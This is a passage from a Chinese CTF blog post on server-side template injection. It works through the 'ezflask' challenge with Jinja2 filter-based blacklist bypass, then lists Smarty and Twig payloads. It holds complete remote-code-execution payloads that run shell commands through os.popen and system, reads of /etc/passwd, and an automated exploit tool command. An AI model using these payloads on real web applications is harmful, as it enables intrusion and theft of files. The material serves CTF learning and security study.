<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> num = (self|<span class="built_in">int</span>) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 0, 通过int过滤器获取数字</span></span><br><span class="line">&#123;% <span class="built_in">set</span> num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 24, 通过length过滤器获取数字</span></span><br><span class="line">&#123;% <span class="built_in">set</span> point = self|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;    <span class="comment"># 通过float过滤器获取点 .</span></span><br></pre></td></tr></table></figure>

<p>有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。</p>
<p>下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。</p>
<h5 id="2020-DASCTF-八月安恒月赛-ezflask"><a href="#2020-DASCTF-八月安恒月赛-ezflask" class="headerlink" title="[2020 DASCTF 八月安恒月赛]ezflask"></a>[2020 DASCTF 八月安恒月赛]ezflask</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        blacklist = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>]</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line">    <span class="keyword">elif</span> safe_jinja(request.args.get(<span class="string">&#x27;name&#x27;</span>)):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">&#x27;wendell&#x27;</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;!--flag in /flag--&gt;</span></span><br><span class="line"><span class="string">    &lt;!--python3.8--&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> orglst = (&#123; &#125;|select|string|<span class="built_in">list</span>) %&#125;&#123;&#123;orglst&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;    <span class="comment"># _</span></span><br></pre></td></tr></table></figure>

<p>同理还能取到更多的字符：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;&#123;&#123;spa&#125;&#125;    <span class="comment"># 空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;    <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;&#123;&#123;zero&#125;&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">40</span>)|<span class="built_in">int</span>) %&#125;&#123;&#123;seven&#125;&#125;    <span class="comment"># 7</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;&#123;&#123;one&#125;&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;%<span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;%<span class="built_in">set</span> three = (zero-one-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 3</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line"><span class="comment">#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先构造出所需的数字:</span></span><br><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;    <span class="comment"># 4</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造出所需的各种字符与字符串: (这里的下标看具体情况)</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;    <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;    <span class="comment"># 空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> point = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">26</span>)|string) %&#125;    <span class="comment"># .</span></span><br><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;    <span class="comment"># 单引号 &#x27;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> left = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">189</span>)|string) %&#125;    <span class="comment"># 左括号 (</span></span><br><span class="line">&#123;% <span class="built_in">set</span> right = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">200</span>)|string) %&#125;    <span class="comment"># 右括号 )</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;    <span class="comment"># 字符 c</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfh = self|string|urlencode|first %&#125;    <span class="comment"># 百分号 %</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;    <span class="comment"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 使用%c构造斜杠 /</span></span><br><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;    <span class="comment"># builtins</span></span><br><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;    <span class="comment"># import</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;    <span class="comment"># popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;    <span class="comment"># os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;    <span class="comment"># cat</span></span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;    <span class="comment"># flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;    <span class="comment"># eval</span></span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;    <span class="comment"># read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;    <span class="comment"># __builtins__</span></span><br></pre></td></tr></table></figure>

<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br></pre></td></tr></table></figure>

<p>如上图所示，成功构造出了 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code> 。</p>
<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;    <span class="comment"># globals</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;    <span class="comment"># builtins</span></span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;    <span class="comment"># eval</span></span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125;    <span class="comment"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终的payload为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span>|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;&#123;% <span class="built_in">set</span> point = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">26</span>)|string) %&#125;&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;&#123;% <span class="built_in">set</span> left = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">189</span>)|string) %&#125;&#123;% <span class="built_in">set</span> right = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">200</span>)|string) %&#125;&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;&#123;% <span class="built_in">set</span> bfh=self|string|urlencode|first %&#125;&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;&#123;% <span class="keyword">if</span> f == bul %&#125;&#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;&#123;% <span class="keyword">if</span> a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>强过滤版：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> zero=((&#123;&#125;|select|string|<span class="built_in">list</span>)|sort|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">4</span>)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span> one=(zero**zero)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> two=(zero-one-one)|<span class="built_in">abs</span>|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> four=(two*two)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> five=(two*two*two)-one-one-one%&#125;&#123;%<span class="built_in">set</span> seven=(zero-one-one-five)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span> xhx=((&#123;&#125;|select|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">24</span>)|string)%&#125;&#123;%<span class="built_in">set</span> space=((&#123;&#125;|select|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">10</span>)|string) %&#125;&#123;%<span class="built_in">set</span> point=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">26</span>)|string)%&#125;&#123;%<span class="built_in">set</span> yin=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">181</span>)|string)%&#125;&#123;%<span class="built_in">set</span> left=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">195</span>)|string)%&#125;&#123;%<span class="built_in">set</span> right=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">199</span>)|string)%&#125;&#123;%<span class="built_in">set</span> c=<span class="built_in">dict</span>(c=aa)|reverse|first %&#125;&#123;%<span class="built_in">set</span> bfh=self|string|urlencode|first %&#125;&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;&#123;%<span class="built_in">set</span> slas=bfhc%((four~seven)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span> but=<span class="built_in">dict</span>(buil=aa,tins=dd)|join%&#125;&#123;%<span class="built_in">set</span> imp=<span class="built_in">dict</span>(imp=aa,ort=dd)|join%&#125;&#123;%<span class="built_in">set</span> pon=<span class="built_in">dict</span>(po=aa,pen=dd)|join%&#125;&#123;%<span class="built_in">set</span> ooo=<span class="built_in">dict</span>(o=aa,s=dd)|join%&#125;&#123;%<span class="built_in">set</span> ca=<span class="built_in">dict</span>(ca=aa,t=dd)|join%&#125;&#123;%<span class="built_in">set</span> flg=<span class="built_in">dict</span>(fl=aa,ag=dd)|join%&#125;&#123;%<span class="built_in">set</span> ev=<span class="built_in">dict</span>(ev=aa,al=dd)|join%&#125;&#123;%<span class="built_in">set</span> red=<span class="built_in">dict</span>(re=aa,ad=dd)|join%&#125;&#123;%<span class="built_in">set</span> bul=xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span>%&#125;&#123;%<span class="built_in">set</span> pld=xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~ooo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%&#125;&#123;%<span class="keyword">for</span> f,v <span class="keyword">in</span> whoami|attr(xhx~xhx~<span class="string">&#x27;init&#x27;</span>~xhx~xhx)|attr(xhx~xhx~<span class="string">&#x27;globals&#x27;</span>~xhx~xhx)|attr(<span class="string">&#x27;items&#x27;</span>)()%&#125;&#123;%<span class="keyword">if</span> f==bul%&#125;&#123;%<span class="keyword">for</span> a,b <span class="keyword">in</span> v|attr(<span class="string">&#x27;items&#x27;</span>)()%&#125;&#123;%<span class="keyword">if</span> a==ev%&#125;&#123;%<span class="built_in">print</span>(b(pld))%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Fenjing-SSTI通杀"><a href="#Fenjing-SSTI通杀" class="headerlink" title="Fenjing SSTI通杀"></a>Fenjing SSTI通杀</h4><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 install fenjing</span><br><span class="line">$ python3 -m fenjing crack -u <span class="string">&quot;http://node5.anna.nssctf.cn:28879/get_flag&quot;</span> -i <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/">浅析SSTI(python沙盒绕过)</a></p>
<p><a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">Jinja2过滤器</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA">关于Flask SSTI，解锁你不知道的新姿势</a><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA">https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA</a>)</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
</blockquote>
<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p><code>&#123;$smarty.version&#125;</code>可以查看smarty版本</p>
<h3 id="1、-php-php"><a href="#1、-php-php" class="headerlink" title="1、{php}{/php}"></a>1、<code>&#123;php&#125;&#123;/php&#125;</code></h3><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p>
<h3 id="2、-literal"><a href="#2、-literal" class="headerlink" title="2、{literal}"></a>2、<code>&#123;literal&#125;</code></h3><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
<p>那么对于php5的环境我们就可以使用</p>
<script language="php">phpinfo();</script>

<h3 id="3、-if"><a href="#3、-if" class="headerlink" title="3、{if}"></a>3、<code>&#123;if&#125;</code></h3><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等  </p>
<p><code>&#123;if phpinfo()&#125;&#123;/if&#125;</code></p>
<h3 id="4、getStreamVariable"><a href="#4、getStreamVariable" class="headerlink" title="4、getStreamVariable"></a>4、getStreamVariable</h3><p>新版本失效<br><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</code></p>
<h2 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h2><p>文件读取</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="keyword">get</span>(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.<span class="keyword">get</span>(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>rce</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=<span class="built_in">cat</span>+/etc/passwd HTTP/1.1</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;<span class="string">&#x27;options&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/20/ssti/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/17/GDOUCTF2023-ezze-wp/" >GDOUCTF2023-&lt;ez_ze&gt;-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-17
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
